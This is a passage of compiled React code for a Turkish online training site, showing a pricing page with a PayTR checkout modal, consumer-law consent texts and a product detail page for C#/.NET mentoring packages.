        setShowCheckout({ id: "result", name: "\xD6deme Tamamland\u0131" });
        window.history.replaceState({}, "", window.location.pathname);
      } else if (payment === "fail") {
        setCheckoutStep(3);
        setCheckoutError("\xD6deme i\u015Flemi ba\u015Far\u0131s\u0131z oldu. L\xFCtfen tekrar deneyin.");
        setShowCheckout({ id: "result", name: "\xD6deme Ba\u015Far\u0131s\u0131z" });
        window.history.replaceState({}, "", window.location.pathname);
      }
    }, []);
    const legalContents = {
      mesafeli: { title: "Mesafeli Sat\u0131\u015F S\xF6zle\u015Fmesi", content: "Bu s\xF6zle\u015Fme, 6502 say\u0131l\u0131 T\xFCketicinin Korunmas\u0131 Hakk\u0131nda Kanun ve Mesafeli S\xF6zle\u015Fmeler Y\xF6netmeli\u011Fi uyar\u0131nca d\xFCzenlenmi\u015Ftir.\n\n1. SATICI B\u0130LG\u0130LER\u0130\n\xDCnvan: Siber Kamp\xFCs Akademi\nAdres: [\u015Eirket adresi]\nE-posta: destek@siberkampus.org\n\n2. KONU\n\u0130\u015Fbu s\xF6zle\u015Fmenin konusu, ALICI'n\u0131n SATICI'ya ait internet sitesinden elektronik ortamda sipari\u015F verdi\u011Fi e\u011Fitim hizmetinin sat\u0131\u015F\u0131 ve teslimi ile ilgili olarak 6502 say\u0131l\u0131 Kanun gere\u011Fince taraflar\u0131n hak ve y\xFCk\xFCml\xFCl\xFCklerinin saptanmas\u0131d\u0131r.\n\n3. \xDCR\xDCN/H\u0130ZMET B\u0130LG\u0130LER\u0130\nSat\u0131n al\u0131nan e\u011Fitim paketinin i\xE7eri\u011Fi, \xF6zellikleri ve \xFCcreti sipari\u015F sayfas\u0131nda belirtilmi\u015Ftir.\n\n4. TESL\u0130MAT\nDijital e\u011Fitim i\xE7erikleri, \xF6demenin onaylanmas\u0131n\u0131n ard\u0131ndan an\u0131nda hesab\u0131n\u0131za tan\u0131mlan\u0131r.\n\n5. CAYMA HAKKI\nT\xFCketici, dijital i\xE7eri\u011Fin ifas\u0131na ba\u015Flanmadan \xF6nce 14 g\xFCn i\xE7inde cayma hakk\u0131n\u0131 kullanabilir. Dijital i\xE7eri\u011Fin ifas\u0131na ba\u015Fland\u0131ktan sonra cayma hakk\u0131 kullan\u0131lamaz." },
      onbilgi: { title: "\xD6n Bilgilendirme Formu", content: "Mesafeli S\xF6zle\u015Fmelere Dair Y\xF6netmelik uyar\u0131nca, t\xFCketiciye s\xF6zle\u015Fme kurulmadan \xF6nce a\u015Fa\u011F\u0131daki bilgiler verilmektedir:\n\n1. SATICI B\u0130LG\u0130LER\u0130\n\xDCnvan: Siber Kamp\xFCs Akademi\nAdres: [\u015Eirket adresi]\nTelefon: [\u0130leti\u015Fim numaras\u0131]\nE-posta: destek@siberkampus.org\n\n2. H\u0130ZMET\u0130N TEMEL N\u0130TEL\u0130KLER\u0130\nOnline siber g\xFCvenlik e\u011Fitim hizmeti sunulmaktad\u0131r. E\u011Fitim i\xE7erikleri, interaktif laboratuvar ortamlar\u0131 ve sertifika programlar\u0131n\u0131 kapsamaktad\u0131r.\n\n3. H\u0130ZMET BEDEL\u0130\nT\xFCm vergiler dahil toplam bedel, \xF6deme sayfas\u0131nda g\xF6sterilmektedir.\n\n4. \xD6DEME \u015EEKL\u0130\nKredi kart\u0131 ile tek \xE7ekim olarak \xF6deme yap\u0131lmaktad\u0131r.\n\n5. CAYMA HAKKI\nT\xFCketici, 14 g\xFCn i\xE7inde herhangi bir gerek\xE7e g\xF6stermeksizin ve cezai \u015Fart \xF6demeksizin s\xF6zle\u015Fmeden cayabilir." },
      iade: { title: "\u0130ade ve \u0130ptal Ko\u015Fullar\u0131", content: "S\u0130BER KAMP\xDCS AKADEM\u0130 \u0130ADE VE \u0130PTAL KO\u015EULLARI\n\n1. D\u0130J\u0130TAL \u0130\xC7ER\u0130K \u0130ADES\u0130\nDijital e\u011Fitim i\xE7eriklerinin iadesi, i\xE7eri\u011Fin hen\xFCz eri\u015Fime a\xE7\u0131lmam\u0131\u015F olmas\u0131 halinde, sat\u0131n alma tarihinden itibaren 14 g\xFCn i\xE7inde yap\u0131labilir.\n\n2. 1'E 1 CANLI E\u011E\u0130T\u0130M \u0130PTAL\u0130\nCanl\u0131 e\u011Fitim program\u0131 ba\u015Flamadan en az 7 g\xFCn \xF6nce iptal talebi yap\u0131lmas\u0131 halinde, \xF6denen bedelin tamam\u0131 iade edilir. E\u011Fitim ba\u015Flad\u0131ktan sonra, kalan ders say\u0131s\u0131 \xFCzerinden orant\u0131l\u0131 iade yap\u0131l\u0131r.\n\n3. \u0130ADE S\xDCREC\u0130\n\u0130ade talepleri destek@siberkampus.org adresine e-posta ile iletilmelidir. \u0130ade bedeli, talebin onaylanmas\u0131ndan itibaren 14 i\u015F g\xFCn\xFC i\xE7inde \xF6deme yap\u0131lan araca iade edilir.\n\n4. \u0130PTAL \u0130\u015ELEM\u0130\nAbonelik veya e\u011Fitim paketi iptalleri, kullan\u0131c\u0131 panelinden veya destek ekibine ba\u015Fvurarak ger\xE7ekle\u015Ftirilebilir." }
    };
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(HeaderCmp, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "py-20 border-b border-[#0c2719] relative overflow-hidden" }, /* @__PURE__ */ React.createElement("div", { className: "absolute top-[-30%] left-1/2 -translate-x-1/2 w-[800px] h-[400px] z-0 pointer-events-none", style: { background: "radial-gradient(ellipse at center,rgba(0,255,136,.08),transparent 62%)" } }), /* @__PURE__ */ React.createElement("div", { className: "max-w-[1280px] mx-auto px-8 text-center relative z-[2]" }, /* @__PURE__ */ React.createElement("span", { className: "font-mono text-[13px] font-medium tracking-[.18em] uppercase text-[#00ff88] inline-flex items-center gap-2.5" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#5c8a74] font-bold" }, "//"), " E\u011E\u0130T\u0130M PAKETLER\u0130"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(36px,5vw,56px)] text-[#eafff5] my-5 font-disp" }, "E\u011Fitim Paketleri & Fiyatland\u0131rma"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] max-w-[640px] mx-auto text-base" }, "\u0130htiyac\u0131n\u0131za uygun e\u011Fitim paketini se\xE7in ve C# & .NET Core yaz\u0131l\u0131m kariyerinize hemen ba\u015Flay\u0131n."))), /* @__PURE__ */ React.createElement("section", { className: "py-20 max-w-[1280px] mx-auto px-6" }, /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-3 gap-6 items-stretch" }, plans.map((plan, idx) => /* @__PURE__ */ React.createElement("div", { key: plan.id, className: `rounded-2xl border p-8 flex flex-col justify-between relative overflow-hidden transition-all duration-300 hover:-translate-y-1 ${plan.popular ? "border-[#00ff88]/50 shadow-[0_0_50px_rgba(0,255,136,0.08)]" : "border-[#0c2719] hover:border-[#103a26]"}`, style: { background: plan.popular ? "linear-gradient(165deg,#091f15,#04100a)" : "linear-gradient(165deg,#07150e,#04100a)" } }, plan.tag && /* @__PURE__ */ React.createElement("div", { className: `absolute top-4 right-4 text-[10px] font-bold px-3 py-1 rounded-full font-mono ${plan.popular ? "bg-[#00ff88] border border-[#00ff88] text-[#021008]" : plan.price > 0 ? "bg-[#ffd166] border border-[#ffd166] text-[#021008]" : "bg-[#74998a] border border-[#74998a] text-[#020806]"}` }, plan.tag), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl overflow-hidden mb-6 border border-[#0c2719]" }, /* @__PURE__ */ React.createElement("img", { src: plan.img, alt: plan.name, className: "w-full h-44 object-cover" })), /* @__PURE__ */ React.createElement("div", { className: "flex-1" }, /* @__PURE__ */ React.createElement("h2", { className: "text-lg text-[#eafff5] font-disp font-bold mb-3 pr-16" }, plan.name), /* @__PURE__ */ React.createElement("div", { className: "mb-6" }, plan.oldPrice && /* @__PURE__ */ React.createElement("span", { className: "text-[#5c8a74] text-lg line-through font-mono mr-2" }, plan.oldPrice.toLocaleString("tr-TR"), " TL"), /* @__PURE__ */ React.createElement("span", { className: "text-3xl font-bold text-[#eafff5] font-mono" }, plan.price === 0 ? "\xDCcretsiz" : plan.price.toLocaleString("tr-TR") + " TL"), plan.period && /* @__PURE__ */ React.createElement("span", { className: "text-xs text-[#74998a] ml-2" }, "/ ", plan.period)), /* @__PURE__ */ React.createElement("hr", { className: "border-[#0c2719] my-5" }), /* @__PURE__ */ React.createElement("ul", { className: "space-y-3 text-sm font-mono" }, plan.features.map((f, fi) => /* @__PURE__ */ React.createElement("li", { key: fi, className: "flex items-start gap-2.5 text-[#9fc4b5]" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] text-xs mt-0.5" }, "\u2714"), /* @__PURE__ */ React.createElement("span", null, f))))), /* @__PURE__ */ React.createElement(
      "button",
      {
        onClick: () => handlePlanClick(plan),
        className: `w-full mt-8 py-3.5 rounded-xl font-mono text-sm font-bold transition-all text-center ${plan.popular ? "text-[#021008] bg-[#00ff88] hover:shadow-[0_0_30px_var(--glow)]" : plan.price > 0 ? "text-[#021008] bg-[#ffd166] hover:shadow-[0_0_30px_rgba(255,209,102,.3)]" : "border border-[#103a26] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88]"}`
      },
      plan.cta
    )))), /* @__PURE__ */ React.createElement("div", { className: "mt-12 text-center" }, /* @__PURE__ */ React.createElement("p", { className: "text-[#5c8a74] text-sm mb-4" }, "G\xFCvenli \xF6deme altyap\u0131s\u0131 ile \xF6deme yapabilirsiniz"), /* @__PURE__ */ React.createElement("img", { src: "/visa-mastercard-troypng.png", alt: "Visa, Mastercard, Troy - G\xFCvenli \xD6deme", className: "h-12 w-auto object-contain mx-auto opacity-80 hover:opacity-100 transition-opacity" }), /* @__PURE__ */ React.createElement("p", { className: "text-[#5c8a74] text-xs mt-3" }, "\u{1F4B3} PCI-DSS 256-Bit G\xFCvenli \xD6deme Altyap\u0131s\u0131"))), showCheckout && /* @__PURE__ */ React.createElement("div", { className: "fixed inset-0 z-[9999] flex items-center justify-center p-4", style: { background: "rgba(0,0,0,.88)" }, onClick: () => !loading && checkoutStep !== 2 && (() => {
      setShowCheckout(null);
      setCheckoutStep(1);
    })() }, /* @__PURE__ */ React.createElement("div", { className: "w-full max-w-lg rounded-2xl border border-[#0c2719] overflow-hidden max-h-[92vh] overflow-y-auto", style: { background: "linear-gradient(165deg,#0a1f15,#04100a)" }, onClick: (e) => e.stopPropagation() }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-between px-7 pt-7 pb-4" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-3" }, /* @__PURE__ */ React.createElement("span", { className: "w-8 h-8 border border-[#00ff88] rounded-lg grid place-items-center text-[#00ff88] font-mono text-sm font-bold" }, ">_"), /* @__PURE__ */ React.createElement("h2", { className: "text-lg text-[#eafff5] font-disp font-bold" }, "G\xFCvenli \xD6deme")), /* @__PURE__ */ React.createElement("button", { onClick: () => {
      if (!loading) {
        setShowCheckout(null);
        setCheckoutStep(1);
      }
    }, className: "text-[#74998a] hover:text-[#eafff5] text-2xl transition-colors leading-none" }, "\xD7")), /* @__PURE__ */ React.createElement("div", { className: "px-7 pb-5" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-2" }, [{ n: 1, t: "Bilgiler" }, { n: 2, t: "\xD6deme" }, { n: 3, t: "Tamamland\u0131" }].map((s, i) => /* @__PURE__ */ React.createElement(React.Fragment, { key: s.n }, i > 0 && /* @__PURE__ */ React.createElement("div", { className: `flex-1 h-px ${checkoutStep >= s.n ? "bg-[#00ff88]" : "bg-[#103a26]"}` }), /* @__PURE__ */ React.createElement("div", { className: `flex items-center gap-1.5 ${checkoutStep >= s.n ? "text-[#00ff88]" : "text-[#5c8a74]"}` }, /* @__PURE__ */ React.createElement("span", { className: `w-6 h-6 rounded-full text-[11px] font-bold grid place-items-center border ${checkoutStep >= s.n ? "border-[#00ff88] bg-[#00ff88]/10" : "border-[#103a26]"}` }, checkoutStep > s.n ? "\u2713" : s.n), /* @__PURE__ */ React.createElement("span", { className: "text-[11px] font-mono hidden sm:inline" }, s.t)))))), /* @__PURE__ */ React.createElement("div", { className: "px-7 pb-7" }, checkoutStep === 1 && showCheckout.price && /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#0c2719] p-4 mb-6 bg-[rgba(0,255,136,.02)]" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-between" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "text-[11px] text-[#74998a] mb-1 font-mono uppercase tracking-wider" }, "Se\xE7ilen Paket"), /* @__PURE__ */ React.createElement("div", { className: "text-[#eafff5] font-bold text-sm" }, showCheckout.name)), /* @__PURE__ */ React.createElement("div", { className: "text-right" }, showCheckout.oldPrice && /* @__PURE__ */ React.createElement("div", { className: "text-[#5c8a74] line-through text-xs font-mono" }, showCheckout.oldPrice.toLocaleString("tr-TR"), " TL"), /* @__PURE__ */ React.createElement("div", { className: "text-[#00ff88] font-bold text-xl font-mono" }, showCheckout.price.toLocaleString("tr-TR"), " TL")))), /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-center gap-4 mb-6 py-3 rounded-xl border border-[#0c2719] bg-[#04100a]/60" }, /* @__PURE__ */ React.createElement("img", { src: "/visa-mastercard-troypng.png", alt: "Visa, Mastercard, Troy", className: "h-8 w-auto object-contain opacity-90" }), /* @__PURE__ */ React.createElement("div", { className: "h-6 w-px bg-[#103a26]" }), /* @__PURE__ */ React.createElement("span", { className: "text-[11px] text-[#74998a] font-mono flex items-center gap-1.5" }, "\u{1F512} PCI-DSS 256-Bit G\xFCvenli")), /* @__PURE__ */ React.createElement("div", { className: "space-y-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs text-[#74998a] mb-1.5 font-mono" }, "Ad Soyad *"), /* @__PURE__ */ React.createElement("input", { type: "text", value: checkoutName, onChange: (e) => setCheckoutName(e.target.value), placeholder: "Ad Soyad", className: "w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" })), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs text-[#74998a] mb-1.5 font-mono" }, "E-posta Adresi *"), /* @__PURE__ */ React.createElement("input", { type: "email", value: checkoutEmail, onChange: (e) => setCheckoutEmail(e.target.value), placeholder: "ornek@mail.com", className: "w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" }), /* @__PURE__ */ React.createElement("p", { className: "text-[10px] text-[#5c8a74] mt-1.5" }, "\xD6deme sonras\u0131 \u015Fifre belirleme ba\u011Flant\u0131s\u0131 bu adrese g\xF6nderilecek."))), /* @__PURE__ */ React.createElement("div", { className: "space-y-3 mb-6" }, /* @__PURE__ */ React.createElement("label", { className: "flex items-start gap-3 cursor-pointer group" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: agreed.mesafeli, onChange: (e) => setAgreed({ ...agreed, mesafeli: e.target.checked }), className: "mt-1 accent-[#00ff88]" }), /* @__PURE__ */ React.createElement("span", { className: "text-xs text-[#9fc4b5]" }, /* @__PURE__ */ React.createElement("button", { type: "button", onClick: () => setShowLegal("mesafeli"), className: "text-[#00ff88] underline hover:text-[#5cffba] transition-colors" }, "Mesafeli Sat\u0131\u015F S\xF6zle\u015Fmesi"), "'ni okudum ve kabul ediyorum.")), /* @__PURE__ */ React.createElement("label", { className: "flex items-start gap-3 cursor-pointer group" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: agreed.onbilgi, onChange: (e) => setAgreed({ ...agreed, onbilgi: e.target.checked }), className: "mt-1 accent-[#00ff88]" }), /* @__PURE__ */ React.createElement("span", { className: "text-xs text-[#9fc4b5]" }, /* @__PURE__ */ React.createElement("button", { type: "button", onClick: () => setShowLegal("onbilgi"), className: "text-[#00ff88] underline hover:text-[#5cffba] transition-colors" }, "\xD6n Bilgilendirme Formu"), "'nu okudum ve kabul ediyorum.")), /* @__PURE__ */ React.createElement("label", { className: "flex items-start gap-3 cursor-pointer group" }, /* @__PURE__ */ React.createElement("input", { type: "checkbox", checked: agreed.iade, onChange: (e) => setAgreed({ ...agreed, iade: e.target.checked }), className: "mt-1 accent-[#00ff88]" }), /* @__PURE__ */ React.createElement("span", { className: "text-xs text-[#9fc4b5]" }, /* @__PURE__ */ React.createElement("button", { type: "button", onClick: () => setShowLegal("iade"), className: "text-[#00ff88] underline hover:text-[#5cffba] transition-colors" }, "\u0130ade ve \u0130ptal Ko\u015Fullar\u0131"), "'n\u0131 okudum ve kabul ediyorum."))), checkoutError && /* @__PURE__ */ React.createElement("div", { className: "mb-4 p-3 rounded-lg border border-red-500/30 bg-red-500/5 text-red-400 text-xs font-mono" }, checkoutError), /* @__PURE__ */ React.createElement(
      "button",
      {
        onClick: handleStartPayment,
        disabled: loading || !agreed.mesafeli || !agreed.onbilgi || !agreed.iade,
        className: "w-full py-4 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_30px_var(--glow)] disabled:opacity-40 disabled:hover:shadow-none transition-all text-center text-sm"
      },
      loading ? /* @__PURE__ */ React.createElement("span", { className: "flex items-center justify-center gap-2" }, /* @__PURE__ */ React.createElement("span", { className: "w-4 h-4 border-2 border-[#021008] border-t-transparent rounded-full animate-spin" }), "Haz\u0131rlan\u0131yor...") : `\xD6demeye Ge\xE7 \u2014 ${showCheckout.price.toLocaleString("tr-TR")} TL`
    )), checkoutStep === 2 && paytrToken && /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-center gap-3 mb-4 text-[#74998a] text-xs font-mono" }, /* @__PURE__ */ React.createElement("span", null, "\u{1F512} G\xFCvenli \xF6deme sayfas\u0131 y\xFCklendi")), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#103a26] overflow-hidden bg-white", style: { minHeight: "460px" } }, /* @__PURE__ */ React.createElement(
      "iframe",
      {
        src: `https://www.paytr.com/odeme/guvenli/${paytrToken}`,
        frameBorder: "0",
        className: "w-full",
        style: { height: "460px", minHeight: "460px" },
        scrolling: "auto"
      }
    )), /* @__PURE__ */ React.createElement("p", { className: "text-[10px] text-[#5c8a74] text-center mt-3" }, "Kart bilgileriniz PayTR g\xFCvenli altyap\u0131s\u0131 taraf\u0131ndan i\u015Flenmektedir.")), checkoutStep === 3 && /* @__PURE__ */ React.createElement("div", { className: "text-center py-8" }, !checkoutError ? /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("div", { className: "w-16 h-16 rounded-full bg-[#00ff88]/10 border-2 border-[#00ff88] grid place-items-center mx-auto mb-5" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] text-3xl" }, "\u2713")), /* @__PURE__ */ React.createElement("h3", { className: "text-xl text-[#eafff5] font-disp font-bold mb-3" }, "\xD6demeniz Al\u0131nd\u0131!"), /* @__PURE__ */ React.createElement("p", { className: "text-[#9fc4b5] text-sm leading-relaxed mb-6 max-w-sm mx-auto" }, "E-posta adresinize \u015Fifre belirleme ba\u011Flant\u0131s\u0131 g\xF6nderildi. L\xFCtfen e-postan\u0131z\u0131 kontrol edin ve \u015Fifrenizi belirleyerek hesab\u0131n\u0131za eri\u015Fin."), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#0c2719] p-4 bg-[rgba(0,255,136,.03)] mb-6 text-left" }, /* @__PURE__ */ React.createElement("div", { className: "text-[11px] text-[#74998a] mb-1 font-mono" }, "Sonraki Ad\u0131mlar"), /* @__PURE__ */ React.createElement("ol", { className: "text-xs text-[#9fc4b5] space-y-1.5 list-decimal pl-4" }, /* @__PURE__ */ React.createElement("li", null, "E-postan\u0131zdaki ba\u011Flant\u0131ya t\u0131klay\u0131n"), /* @__PURE__ */ React.createElement("li", null, "\u015Eifrenizi belirleyin"), /* @__PURE__ */ React.createElement("li", null, "E\u011Fitim platformuna giri\u015F yap\u0131n"))), /* @__PURE__ */ React.createElement("button", { onClick: () => {
      setShowCheckout(null);
      setCheckoutStep(1);
    }, className: "border border-[#103a26] text-[#cdeede] px-6 py-2.5 text-sm rounded-xl hover:border-[#00ff88] hover:text-[#00ff88] transition-colors font-mono" }, "Kapat")) : /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("div", { className: "w-16 h-16 rounded-full bg-red-500/10 border-2 border-red-500/50 grid place-items-center mx-auto mb-5" }, /* @__PURE__ */ React.createElement("span", { className: "text-red-400 text-3xl" }, "\u2715")), /* @__PURE__ */ React.createElement("h3", { className: "text-xl text-[#eafff5] font-disp font-bold mb-3" }, "\xD6deme Ba\u015Far\u0131s\u0131z"), /* @__PURE__ */ React.createElement("p", { className: "text-[#9fc4b5] text-sm leading-relaxed mb-6" }, checkoutError), /* @__PURE__ */ React.createElement("button", { onClick: () => {
      setCheckoutStep(1);
      setCheckoutError("");
    }, className: "text-[#021008] bg-[#00ff88] px-6 py-2.5 text-sm rounded-xl font-mono font-bold hover:shadow-[0_0_20px_var(--glow)] transition-all" }, "Tekrar Dene")))))), showLegal && /* @__PURE__ */ React.createElement("div", { className: "fixed inset-0 z-[10000] flex items-center justify-center p-4", style: { background: "rgba(0,0,0,.9)" }, onClick: () => setShowLegal(null) }, /* @__PURE__ */ React.createElement("div", { className: "w-full max-w-xl rounded-2xl border border-[#0c2719] p-8 max-h-[80vh] overflow-y-auto", style: { background: "linear-gradient(165deg,#0a1f15,#04100a)" }, onClick: (e) => e.stopPropagation() }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-between mb-6" }, /* @__PURE__ */ React.createElement("h3", { className: "text-lg text-[#eafff5] font-disp font-bold" }, legalContents[showLegal]?.title), /* @__PURE__ */ React.createElement("button", { onClick: () => setShowLegal(null), className: "text-[#74998a] hover:text-[#eafff5] text-2xl transition-colors" }, "\xD7")), /* @__PURE__ */ React.createElement("div", { className: "text-sm text-[#9fc4b5] leading-relaxed whitespace-pre-wrap font-mono" }, legalContents[showLegal]?.content), /* @__PURE__ */ React.createElement("button", { onClick: () => {
      setAgreed((prev) => ({ ...prev, [showLegal]: true }));
      setShowLegal(null);
    }, className: "mt-6 w-full py-3 font-mono text-sm font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_20px_var(--glow)] transition-all" }, "Okudum ve Kabul Ediyorum"))), /* @__PURE__ */ React.createElement(FooterCmp, { navigate }));
  };
  var ProductDetailPage = ({ navigate, data }) => {
    const HeaderCmp = window.SKHeader || (() => null);
    const FooterCmp = window.SKFooter || (() => null);
    const useUser2 = window.SKuseUser || (() => [null]);
    const [user] = useUser2();
    const productId = data && data.id;
    const products = {
      "free-basic": {
        name: "15 Dk. \xDCcretsiz \xD6n G\xF6r\xFC\u015Fme",
        price: 0,
        oldPrice: null,
        img: "/freeeducationiamge-fiyatland\u0131rma.jpg",
        desc: "Yaz\u0131l\u0131m kariyerinize ilk ad\u0131m\u0131 at\u0131n! 15 dakikal\u0131k \xFCcretsiz tan\u0131\u015Fma g\xF6r\xFC\u015Fmesinde seviyenizi analiz eder, hedeflerinize uygun ki\u015Fisel yol haritas\u0131 olu\u015Fturur ve mentorluk s\xFCrecinin detaylar\u0131n\u0131 payla\u015F\u0131r\u0131z.",
        features: ["Bire Bir Tan\u0131\u015Fma G\xF6r\xFC\u015Fmesi", "Algoritma & Seviye Tespiti", "\xDCcretsiz Yol Haritas\u0131 Planlamas\u0131", "Mentorluk S\xFCreci Detaylar\u0131"],
        isFree: true
      },
      "web-pentest": {
        name: "1'e 1 Canl\u0131 Ment\xF6rl\xFCk & Backend E\u011Fitimi",
        price: 1500,
        oldPrice: 3e3,
        img: "/mentoregitimi-fiyatland\u0131rma.jpg",
        desc: "Yusuf \u0130slam Yetkin ile 1 saatlik bire bir canl\u0131 ment\xF6rl\xFCk seans\u0131. C# / .NET Core hata \xE7\xF6z\xFCm\xFC, kod incelemesi, mimari dan\u0131\u015Fmanl\u0131k veya kariyer y\xF6nlendirmesi \u2014 ihtiyac\u0131n\u0131z olan konuda birebir destek al\u0131n.",
        features: ["1 Saat Bire Bir Canl\u0131 Geli\u015Ftirme Seans\u0131", "C# / .NET Core Hata \xC7\xF6z\xFCm\xFC & Dan\u0131\u015Fmanl\u0131k", "\xD6zel Kod \u0130ncelemesi (Code Review)", "Yusuf \u0130slam Yetkin ile Do\u011Frudan Ba\u011Flant\u0131"],
        isFree: false
      },
      "one-on-one": {
        name: "\u0130leri D\xFCzey C# & .NET Core Backend Uzman\u0131 E\u011Fitimi",
        price: 2e4,
        oldPrice: 4e4,
        img: "/uzmanegitim-fiyatland\u0131rma.jpg",
        desc: "10 saatlik bire bir canl\u0131 ment\xF6rl\xFCk paketiyle finans ve bankac\u0131l\u0131k seviyesinde backend mimarisi, Netflix & Uber d\xFCzeyinde sistem tasar\u0131m\u0131, mikroservisler ve da\u011F\u0131t\u0131k mimari konular\u0131nda derinlemesine uzmanla\u015F\u0131n.",
        features: ["10 Saat Bire Bir Canl\u0131 Ment\xF6rl\xFCk & Kodlama", "Finans & Bankac\u0131l\u0131k Seviyesinde Backend Mimarisi", "Netflix & Uber D\xFCzeyinde Sistem Tasar\u0131m\u0131 (System Design)", "Mikroservisler, Event-Driven & Da\u011F\u0131t\u0131k Mimari", "Kubernetes, Docker, RabbitMQ & Redis Entegrasyonu", "CV Haz\u0131rlama, Teknik M\xFClakat Sim\xFClasyonu & \u0130\u015F Referans\u0131"],
        isFree: false
      }
    };
    const product = products[productId];
    if (!product) {
      return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(HeaderCmp, { navigate }), /* @__PURE__ */ React.createElement("div", { className: "min-h-screen flex items-center justify-center" }, /* @__PURE__ */ React.createElement("div", { className: "text-center" }, /* @__PURE__ */ React.createElement("h1", { className: "text-3xl text-[#eafff5] mb-4" }, "\xDCr\xFCn Bulunamad\u0131"), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("pricing"), className: "text-[#00ff88] hover:underline font-mono" }, "\u2190 Fiyatland\u0131rmaya D\xF6n"))), /* @__PURE__ */ React.createElement(FooterCmp, { navigate }));
    }
    const handleAction = () => {
      if (product.isFree) {
        if (user) {
          navigate("dashboard");
        } else {
          window.__SK_REGISTER_INFO = "Kay\u0131t olarak platformdaki \xFCcretsiz e\u011Fitimlere eri\u015Febilirsiniz.";
          navigate("register");
        }
      } else {
        navigate("pricing");
      }
    };
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(HeaderCmp, { navigate }), /* @__PURE__ */ React.createElement("section", { className: "py-20 border-b border-[#0c2719] relative overflow-hidden" }, /* @__PURE__ */ React.createElement("div", { className: "absolute top-[-30%] left-1/2 -translate-x-1/2 w-[800px] h-[400px] z-0 pointer-events-none", style: { background: "radial-gradient(ellipse at center,rgba(0,255,136,.08),transparent 62%)" } }), /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8 relative z-[2]" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("pricing"), className: "text-[#74998a] hover:text-[#00ff88] text-sm font-mono mb-8 inline-flex items-center gap-2 transition-colors" }, "\u2190 Fiyatland\u0131rma"), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 lg:grid-cols-2 gap-12 items-center" }, /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl overflow-hidden border border-[#0c2719]" }, /* @__PURE__ */ React.createElement("img", { src: product.img, alt: product.name, className: "w-full h-80 object-cover" })), /* @__PURE__ */ React.createElement("div", null, product.oldPrice && /* @__PURE__ */ React.createElement("span", { className: "inline-flex items-center gap-2 bg-[#00ff88]/10 border border-[#00ff88]/30 rounded-full px-4 py-1.5 text-[#00ff88] text-xs font-bold font-mono mb-4" }, "\u{1F525} %50 \u0130ND\u0130R\u0130M"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(28px,4vw,42px)] text-[#eafff5] font-disp font-bold mb-4" }, product.name), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-base leading-relaxed mb-6" }, product.desc), /* @__PURE__ */ React.createElement("div", { className: "mb-6" }, product.oldPrice && /* @__PURE__ */ React.createElement("span", { className: "text-[#5c8a74] text-xl line-through font-mono mr-3" }, product.oldPrice.toLocaleString("tr-TR"), " TL"), /* @__PURE__ */ React.createElement("span", { className: "text-4xl font-bold text-[#eafff5] font-mono" }, product.price === 0 ? "\xDCcretsiz" : product.price.toLocaleString("tr-TR") + " TL")), /* @__PURE__ */ React.createElement("button", { onClick: handleAction, className: "font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-8 py-4 rounded-xl hover:shadow-[0_0_30px_var(--glow)] transition-all" }, product.isFree ? user ? "Panele Git" : "E\u011Fitime Ba\u015Fla \u26A1" : "Sat\u0131n Al \u26A1"))))), /* @__PURE__ */ React.createElement("section", { className: "py-16 max-w-[1080px] mx-auto px-8" }, /* @__PURE__ */ React.createElement("h2", { className: "text-2xl text-[#eafff5] font-disp font-bold mb-8" }, "Bu E\u011Fitimde Neler Var?"), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4" }, product.features.map((f, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "flex items-center gap-3 rounded-xl border border-[#0c2719] p-5", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* 